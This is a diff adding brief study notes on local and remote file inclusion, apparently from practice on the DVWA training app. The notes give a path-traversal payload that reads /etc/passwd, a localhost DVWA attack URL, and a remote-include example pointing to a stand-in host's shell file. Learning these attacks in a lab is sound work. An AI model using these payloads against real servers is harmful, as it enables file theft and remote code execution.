@@ -1,0 +1,18 @@
+File Inclusion happens when a website lets a user choose a file to load, but it doesn’t check properly what the user is trying to load. This can be used by attackers to load system files, read secrets, or even run code on the server.
+
+
+
+
+Type	What it does	Example
+LFI	Loads local files on server	../../../../etc/passwd
+RFI	Loads files from remote server	http://evil.com/shell.txt
+Goal	Read files or run code on the server	RCE, data theft, etc.
+
+
+LFI attack= http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
+
+RFI attack=
+
+
+Low == LFI 1= page=../../../../../../../etc/passwd
+       RFI 2= page=http://google.com
